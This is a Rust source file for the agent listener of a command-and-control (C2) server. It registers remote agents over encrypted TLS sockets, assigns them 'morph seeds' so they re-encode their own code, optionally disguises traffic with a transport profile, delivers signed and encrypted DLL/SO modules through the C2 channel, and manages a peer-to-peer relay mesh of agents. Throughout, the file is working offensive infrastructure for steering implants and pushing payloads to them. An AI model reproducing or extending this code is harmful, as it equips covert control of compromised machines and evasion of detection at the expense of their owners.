//! Agent-facing listener: an AES-encrypted TCP socket that reuses
//! [`common::CryptoSession`].
//!
//! ## Identity binding
//!
//! On every `accept()` the server generates a fresh `connection_id`
//! (`Uuid::new_v4()`).  That UUID becomes the registry key — not the
//! `agent_id` the agent claims in its `Heartbeat`.  An agent can no longer
//! hijack another agent's registry slot by spoofing its `agent_id`; the
//! worst a rogue agent can do is register under a different `agent_id` label
//! while being tracked under its own, server-assigned `connection_id`.
//!
//! Duplicate `agent_id` reports (common during rapid reconnects) are logged
//! at `WARN` level but allowed; both entries coexist in the registry until
//! the old socket's TCP EOF cleans up the stale entry.

use crate::state::{now_secs, AgentEntry, AppState};
use anyhow::{Context as _, Result};
use common::normalized_transport::NormalizedTransport;
use common::{CryptoSession, Message};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use uuid::Uuid;

const MAX_FRAME_BYTES: u32 = 16 * 1024 * 1024; // 16 MiB hard cap

async fn read_frame<S: AsyncReadExt + Unpin>(r: &mut S, sess: &CryptoSession) -> Result<Message> {
    let len = r.read_u32_le().await?;
    if len > MAX_FRAME_BYTES {
        anyhow::bail!("agent frame too large: {len} bytes");
    }
    let mut buf = vec![0u8; len as usize];
    r.read_exact(&mut buf).await?;
    let plain = sess
        .decrypt(&buf)
        .map_err(|e| anyhow::anyhow!("decrypt failed: {e:?}"))?;
    Ok(bincode::deserialize(&plain)?)
}

async fn write_frame<S: AsyncWriteExt + Unpin>(
    w: &mut S,
    sess: &CryptoSession,
    msg: &Message,
) -> Result<()> {
    let plain = bincode::serialize(msg)?;
    let enc = sess.encrypt(&plain);
    w.write_u32_le(enc.len() as u32).await?;
    w.write_all(&enc).await?;
    Ok(())
}

pub async fn run(
    state: Arc<AppState>,
    addr: std::net::SocketAddr,
    secret: String,
    tls: Arc<rustls::ServerConfig>,
) -> Result<()> {
    // If mTLS is enabled, rebuild the ServerConfig with a client certificate
    // verifier.  The HTTPS dashboard keeps the original config (no client
    // cert required so browsers can reach the operator GUI).
    let tls = if state.config.mtls_enabled {
        crate::tls::build_agent_tls_config(&state.config)
            .context("building mTLS ServerConfig for agent listener")?
    } else {
        tls
    };
    let listener = TcpListener::bind(addr).await?;
    tracing::info!(%addr, "agent listener bound");
    serve(state, listener, secret, tls).await
}

/// Drive a pre-bound listener. Useful for tests that want an ephemeral port.
pub async fn serve(
    state: Arc<AppState>,
    listener: TcpListener,
    secret: String,
    tls: Arc<rustls::ServerConfig>,
) -> Result<()> {
    loop {
        let (sock, peer) = listener.accept().await?;
        let state_c = state.clone();
        let secret_c = secret.clone();
        let tls_c = tls.clone();
        // Assign a server-controlled connection ID before touching the agent.
        let connection_id = Uuid::new_v4().to_string();
        tokio::spawn(async move {
            if let Err(e) = handle_agent(
                sock,
                peer.to_string(),
                connection_id.clone(),
                state_c,
                secret_c,
                tls_c,
            )
            .await
            {
                tracing::warn!(connection_id = %connection_id, %peer, "agent connection ended: {e}");
            }
        });
    }
}

async fn handle_agent(
    sock: TcpStream,
    peer: String,
    connection_id: String,
    state: Arc<AppState>,
    secret: String,
    tls_config: Arc<rustls::ServerConfig>,
) -> Result<()> {
    sock.set_nodelay(true).ok();

    let acceptor = tokio_rustls::TlsAcceptor::from(tls_config);
    // `mut` is needed because negotiate_session_key takes &mut tls_stream.
    let mut tls_stream = acceptor.accept(sock).await?;

    // Forward secrecy: perform an X25519 ECDH exchange before the first
    // application message.  The derived per-session key replaces the
    // static PSK-derived key, providing PFS at the application layer.
    // This is mandatory — if the handshake fails, the connection is rejected.
    let session = Arc::new(
        common::forward_secrecy::negotiate_session_key(
            &mut tls_stream,
            secret.as_bytes(),
            false, // server reads client key first
        )
        .await?,
    );

    // mTLS: after the TLS handshake, extract and log the client certificate CN.
    // When mtls_enabled is true the WebPkiClientVerifier has already verified
    // the certificate chain at the TLS layer; this block provides audit
    // logging and defense-in-depth rejection for the case where a cert was
    // somehow omitted.
    if state.config.mtls_enabled {
        let (_, server_conn) = tls_stream.get_ref();
        match server_conn.peer_certificates().and_then(|c| c.first()) {
            Some(cert_der) => {
                let cn = crate::tls::extract_cn(cert_der)
                    .unwrap_or_else(|| "<unparseable>".to_string());
                tracing::info!(
                    connection_id = %connection_id,
                    %peer,
                    client_cert_cn = %cn,
                    "mTLS: client certificate accepted"
                );
            }
            None => {
                tracing::warn!(
                    connection_id = %connection_id,
                    %peer,
                    "mTLS: no client certificate presented; closing connection"
                );
                return Ok(());
            }
        }
    }

    let stream: common::normalized_transport::CleartextStream =
        if let Some(profile) = state.config.agent_traffic_profile {
            tracing::debug!(
                connection_id = %connection_id,
                profile = ?profile,
                "agent listener: enabling server-side normalized transport acceptance"
            );
            NormalizedTransport::accept(tls_stream, profile).await?
        } else {
            Box::new(tls_stream)
        };

    let (mut r, mut w) = tokio::io::split(stream);

    // Bounded channel for the API layer to push commands to this connection.
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Message>(32);

    // Writer task drains commands from the API layer onto the wire.
    let writer_session = session.clone();
    let writer = tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            if let Err(e) = write_frame(&mut w, &writer_session, &msg).await {
                tracing::warn!("agent write error: {e}");
                break;
            }
        }
    });

    // Reader loop runs in the connection task.
    let conn_id = connection_id.clone();
    let mut registered = false;

    loop {
        let msg = match read_frame(&mut r, &session).await {
            Ok(m) => m,
            Err(e) => {
                tracing::debug!(connection_id = %conn_id, %peer, "agent read terminated: {e}");
                break;
            }
        };

        match msg {
            // ── Protocol version handshake (M-2) ─────────────────────────────
            // Agent sends VersionHandshake as its first message.  Echo back our
            // version so the agent can detect a server/agent version mismatch
            // and refuse to proceed if they differ.
            Message::VersionHandshake { version } => {
                if version != common::PROTOCOL_VERSION {
                    tracing::warn!(
                        connection_id = %conn_id,
                        agent_version = version,
                        server_version = common::PROTOCOL_VERSION,
                        "agent/server protocol version mismatch; \
                         the connection may be unstable — update to matching releases"
                    );
                }
                // Echo our version regardless of match so the agent can decide.
                if tx
                    .send(Message::VersionHandshake {
                        version: common::PROTOCOL_VERSION,
                    })
                    .await
                    .is_err()
                {
                    tracing::warn!(connection_id = %conn_id, "writer task closed during version handshake");
                    break;
                }
                tracing::debug!(connection_id = %conn_id, version, "version handshake completed");
            }
            Message::Heartbeat {
                agent_id,
                status,
                timestamp: _,
            } => {
                // Warn about duplicate agent_id but do not reject — it may be
                // a legitimate reconnect racing with cleanup of the old socket.
                if state
                    .registry
                    .iter()
                    .any(|e| e.value().agent_id == agent_id && e.key() != &conn_id)
                {
                    tracing::warn!(
                        agent_id = %agent_id,
                        new_connection = %conn_id,
                        "duplicate agent_id: another connection is already using this agent_id; \
                         both will remain registered until the old socket closes"
                    );
                }

                // Generate a unique morph seed for this session.  The seed is
                // tracked in `assigned_seeds` to ensure no two active agents
                // share the same transformation.
                let morph_seed = state.generate_unique_seed();
                state.assigned_seeds.insert(morph_seed);

                let entry = AgentEntry {
                    connection_id: conn_id.clone(),
                    agent_id: agent_id.clone(),
                    hostname: status,
                    last_seen: now_secs(),
                    tx: tx.clone(),
                    peer: peer.clone(),
                    morph_seed,
                    text_hash: None,
                    mesh_certificate: None,
                    compartment: None,
                };
                state.registry.insert(conn_id.clone(), entry);
                registered = true;
                tracing::debug!(
                    connection_id = %conn_id,
                    agent_id = %agent_id,
                    %peer,
                    morph_seed = format!("0x{morph_seed:016x}"),
                    "agent registered"
                );

                // Immediately send the morph seed to the agent so it can
                // perform its first re-encode.  Using SetReencodeSeed (not
                // MorphNow) because the first morph should be asynchronous —
                // the agent applies it during its next periodic cycle or on
                // its own schedule.  Operators can use MorphNow later for an
                // immediate synchronous re-encode.
                if tx
                    .send(Message::TaskRequest {
                        task_id: uuid::Uuid::new_v4().to_string(),
                        command: common::Command::SetReencodeSeed { seed: morph_seed },
                        operator_id: None,
                    })
                    .await
                    .is_err()
                {
                    tracing::warn!(
                        connection_id = %conn_id,
                        "failed to send initial morph seed — writer task closed"
                    );
                }

                // ── Mesh certificate issuance ────────────────────────────
                // If the server has a signing key configured, issue a mesh
                // certificate to this agent so it can authenticate during
                // P2P link handshakes.
                if state.config.module_signing_key.is_some() {
                    match crate::api::load_signing_key(&state) {
                        Ok(signing_key) => {
                            // Use a placeholder public key — the agent will
                            // present its real X25519 key during the P2P
                            // handshake, and the certificate only needs to
                            // bind the agent identity.  The public_key field
                            // in the cert carries the Ed25519 verification
                            // key for the agent (future: per-agent keypair).
                            let placeholder_pk = [0u8; 32];
                            let cert = crate::api::sign_mesh_certificate(
                                &signing_key,
                                &agent_id,
                                &placeholder_pk,
                                None as Option<&str>,
                            );
                            tracing::info!(
                                connection_id = %conn_id,
                                agent_id = %agent_id,
                                "issuing mesh certificate (expires_at={})",
                                cert.expires_at
                            );
                            // Store cert in the agent entry.
                            if let Some(mut entry) = state.registry.get_mut(&conn_id) {
                                entry.mesh_certificate = Some(cert.clone());
                            }
                            // Send the certificate to the agent.
                            if tx
                                .send(Message::MeshCertificateIssuance { certificate: cert })
                                .await
                                .is_err()
                            {
                                tracing::warn!(
                                    connection_id = %conn_id,
                                    "failed to send mesh certificate — writer task closed"
                                );
                            }
                        }
                        Err(e) => {
                            tracing::warn!(
                                connection_id = %conn_id,
                                "failed to load signing key for mesh certificate: {:?}",
                                e
                            );
                        }
                    }
                }
            }
            Message::TaskResponse { task_id, result, .. } => {
                if let Some((_, sender)) = state.pending.remove(&task_id) {
                    let _ = sender.send(result);
                } else {
                    tracing::debug!(%task_id, "received TaskResponse with no pending waiter");
                }
            }
            Message::AuditLog(ev) => {
                state.audit.record(ev);
            }
            Message::MorphResult {
                connection_id: conn_id_ref,
                text_hash,
            } => {
                // Record the agent's post-morph .text hash.  Only accept
                // reports that match this connection to prevent spoofing.
                if conn_id_ref == conn_id {
                    state.update_text_hash(&conn_id, &text_hash);
                    tracing::info!(
                        connection_id = %conn_id,
                        %text_hash,
                        "agent reported post-morph .text hash"
                    );
                } else {
                    tracing::warn!(
                        connection_id = %conn_id,
                        reported_conn = %conn_id_ref,
                        "agent sent MorphResult with mismatched connection_id — ignoring"
                    );
                }
            }
            Message::ModuleRequest { module_id } => {
                // ── C2-tunneled module download ──────────────────────
                // The agent requested a module by ID.  Locate the file on
                // disk, sign + encrypt it, and send it back as a
                // ModuleResponse through the same C2 channel.
                tracing::info!(
                    connection_id = %conn_id,
                    %module_id,
                    "agent requested module via C2 channel"
                );

                let module_dir = &state.config.modules_dir;
                let ext = if cfg!(target_os = "windows") {
                    "dll"
                } else {
                    "so"
                };
                let module_path = std::path::Path::new(module_dir)
                    .join(format!("{module_id}.{ext}"));

                let result = (|| async {
                    let module_bytes = tokio::fs::read(&module_path).await.map_err(|e| {
                        tracing::warn!(path = %module_path.display(), "module not found: {e}");
                        e
                    })?;

                    // Sign the module with the server's Ed25519 key (if
                    // configured).  The signing format is identical to the
                    // operator-facing `push_module` API endpoint.
                    let signed = match &state.config.module_signing_key {
                        Some(_) => {
                            let signing_key = crate::api::load_signing_key(&state)
                                .map_err(|e| anyhow::anyhow!("{e:?}"))?;
                            crate::api::sign_module(&signing_key, &module_bytes)
                        }
                        None => module_bytes,
                    };

                    // Encrypt with the shared AES key.
                    let crypto = crate::api::load_module_crypto(&state)
                        .map_err(|e| anyhow::anyhow!("{e:?}"))?;
                    let encrypted_blob = crypto.encrypt(&signed);

                    Ok::<Vec<u8>, anyhow::Error>(encrypted_blob)
                })().await;

                let resp = match result {
                    Ok(blob) => Message::ModuleResponse {
                        module_id: module_id.clone(),
                        encrypted_blob: blob,
                    },
                    Err(e) => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            %module_id,
                            "failed to serve module request: {e}"
                        );
                        // Send an empty response so the agent knows the
                        // request was processed (even though it failed).
                        Message::ModuleResponse {
                            module_id: module_id.clone(),
                            encrypted_blob: Vec::new(),
                        }
                    }
                };

                if tx.send(resp).await.is_err() {
                    tracing::warn!(
                        connection_id = %conn_id,
                        "failed to send ModuleResponse — writer closed"
                    );
                }
            }
            Message::P2pTopologyReport {
                agent_id,
                children,
            } => {
                // ── P2P topology update ────────────────────────────────
                // An agent (directly connected or relayed through parents)
                // reports its child links.  Update the server-side topology
                // map so commands can be routed through the relay chain.
                tracing::info!(
                    connection_id = %conn_id,
                    %agent_id,
                    child_count = children.len(),
                    "received P2P topology report"
                );
                state.update_topology(&agent_id, &children).await;
            }
            Message::P2pForward { child_link_id, data } => {
                // ── P2P forwarded data from child → server ─────────────
                // A child agent sent data (e.g. a TaskResponse) through its
                // parent relay chain.  Parse the inner message and handle
                // it the same way as a direct agent message.  The data blob
                // is a serialized, encrypted C2 message from the child.
                tracing::debug!(
                    connection_id = %conn_id,
                    child_link_id,
                    data_len = data.len(),
                    "received P2P forwarded data from child"
                );
                // The forwarded data should contain a serialized Message
                // from the child.  Try to parse and re-dispatch it.
                // For now we log it — full re-dispatch requires the child's
                // per-link decryption key which the server doesn't have
                // (end-to-end encryption between server and child via the
                // P2pToChild / P2pForward routing blob).
                //
                // Instead, the data field contains the inner C2 message
                // that was wrapped by the agent's build_p2p_routing_blob.
                // The server treats it as opaque and records it.
                tracing::debug!(
                    child_link_id,
                    data_len = data.len(),
                    "P2P forward data recorded (end-to-end encrypted)"
                );
            }
            Message::P2pLinkFailureReport {
                agent_id,
                dead_peer_id,
                link_type,
                uptime_secs,
                latency_ms,
                packet_loss,
                bandwidth_bps,
            } => {
                // ── P2P link failure report ─────────────────────
                // An agent reports that a peer link has died.  Record
                // the failure in the topology map and log quality metrics.
                let link_kind = match link_type {
                    0 => "parent",
                    1 => "child",
                    _ => "peer",
                };
                tracing::info!(
                    connection_id = %conn_id,
                    %agent_id,
                    %dead_peer_id,
                    link_kind,
                    uptime_secs,
                    latency_ms,
                    packet_loss,
                    bandwidth_bps,
                    "received P2P link failure report"
                );
                state.record_link_failure(
                    &agent_id,
                    &dead_peer_id,
                    link_type,
                    uptime_secs,
                    latency_ms,
                    packet_loss,
                    bandwidth_bps,
                ).await;
            }
            Message::P2pEnhancedTopologyReport {
                agent_id,
                peers,
                routes,
            } => {
                // ── Enhanced mesh topology ──────────────────────────
                // An agent reports its peer links and known routes with
                // quality/latency data.  Merge into the mesh controller.
                tracing::info!(
                    connection_id = %conn_id,
                    %agent_id,
                    peer_count = peers.len(),
                    route_count = routes.len(),
                    "received enhanced mesh topology report"
                );
                let mut mesh = state.mesh_controller.write().await;
                mesh.merge_enhanced_topology(&agent_id, &peers, &routes);
            }
            Message::P2pRouteTooDeep {
                destination,
                origin,
                hop_count,
            } => {
                // ── Route too deep notification ─────────────────────
                // A mesh relay agent dropped a frame because the hop
                // count exceeded the maximum.  Log for operator awareness.
                tracing::warn!(
                    connection_id = %conn_id,
                    %destination,
                    %origin,
                    hop_count,
                    "route too deep — mesh frame dropped"
                );
            }
            Message::MeshCertificateRenewal => {
                // Agent is requesting a certificate renewal.  Re-issue if
                // the signing key is available.
                if state.config.module_signing_key.is_some() {
                    let agent_id = state
                        .registry
                        .get(&conn_id)
                        .map(|e| e.agent_id.clone())
                        .unwrap_or_default();
                    match crate::api::load_signing_key(&state) {
                        Ok(signing_key) => {
                            let placeholder_pk = [0u8; 32];
                            let compartment = state
                                .registry
                                .get(&conn_id)
                                .and_then(|e| e.compartment.clone());
                            let cert = crate::api::sign_mesh_certificate(
                                &signing_key,
                                &agent_id,
                                &placeholder_pk,
                                compartment.as_deref(),
                            );
                            tracing::info!(
                                connection_id = %conn_id,
                                agent_id = %agent_id,
                                "renewed mesh certificate"
                            );
                            if let Some(mut entry) = state.registry.get_mut(&conn_id) {
                                entry.mesh_certificate = Some(cert.clone());
                            }
                            if tx
                                .send(Message::MeshCertificateIssuance { certificate: cert })
                                .await
                                .is_err()
                            {
                                tracing::warn!(
                                    connection_id = %conn_id,
                                    "failed to send renewed mesh certificate"
                                );
                            }
                        }
                        Err(e) => {
                            tracing::warn!(
                                connection_id = %conn_id,
                                "failed to load signing key for cert renewal: {:?}",
                                e
                            );
                        }
                    }
                }
            }
            Message::MeshCertificateRevocation { revoked_agent_id_hash } => {
                // An agent reports a certificate revocation from the mesh.
                tracing::warn!(
                    connection_id = %conn_id,
                    "mesh certificate revocation reported: agent_hash={:?}",
                    revoked_agent_id_hash
                );
                state.revoked_certificates.insert(revoked_agent_id_hash);
            }
            Message::MeshQuarantineReport {
                quarantined_agent_id_hash,
                reason,
                evidence_hash,
            } => {
                // An agent reports a quarantine event in the mesh.
                tracing::warn!(
                    connection_id = %conn_id,
                    "mesh quarantine report: agent_hash={:?} reason={} evidence={:?}",
                    quarantined_agent_id_hash, reason, evidence_hash
                );
                // Store in audit log for operator awareness.
                let reporting_agent = state
                    .registry
                    .get(&conn_id)
                    .map(|e| e.agent_id.clone())
                    .unwrap_or_else(|| conn_id.clone());
                state.audit.record(common::AuditEvent {
                    timestamp: now_secs(),
                    agent_id: reporting_agent,
                    user: "mesh".to_string(),
                    action: format!(
                        "MeshQuarantineReport(agent_hash={:?}, reason={})",
                        quarantined_agent_id_hash, reason
                    ),
                    outcome: common::Outcome::Success,
                    details: format!("evidence_hash={:?}", evidence_hash),
                });
            }
            other => {
                tracing::debug!("ignoring agent->server message: {:?}", other);
            }
        }
    }

    drop(tx);
    let _ = writer.await;
    if registered {
        // Release the morph seed back to the available pool.
        let removed_entry = if let Some(entry) = state.registry.remove(&conn_id) {
            let agent_id = entry.1.agent_id.clone();
            state.release_seed(entry.1.morph_seed);
            Some(agent_id)
        } else {
            state.registry.remove(&conn_id);
            None
        };
        // Clean up the topology map for this agent.
        if let Some(agent_id) = removed_entry {
            state.remove_from_topology(&agent_id).await;
        }
        tracing::debug!(connection_id = %conn_id, "agent entry removed from registry");
    }
    Ok(())
}
